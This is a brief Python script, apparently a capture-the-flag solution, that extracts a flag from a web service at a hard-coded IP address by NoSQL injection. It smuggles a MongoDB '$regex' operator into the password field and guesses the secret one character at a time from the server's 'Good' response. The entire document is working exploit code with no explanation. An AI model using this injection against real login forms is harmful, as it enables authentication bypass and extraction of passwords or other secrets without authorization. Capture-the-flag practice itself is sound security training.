import string,requests
s=string.ascii_letters+string.digits+'{}_@'
url="http://111.186.57.85:10025/"
flag='0ops{mongoDB_1s_funny'
while flag[-1]!='}':
    username='a'
    for each in s:
        payload=flag+each
        password='","password":{"$regex":"^'+payload+'.*"},"username":"admin'
        data={"username":username,"password":password}
        html=requests.post(url,data=data).text
        if "Good" in html:
            flag+=each
            break
    print(flag)
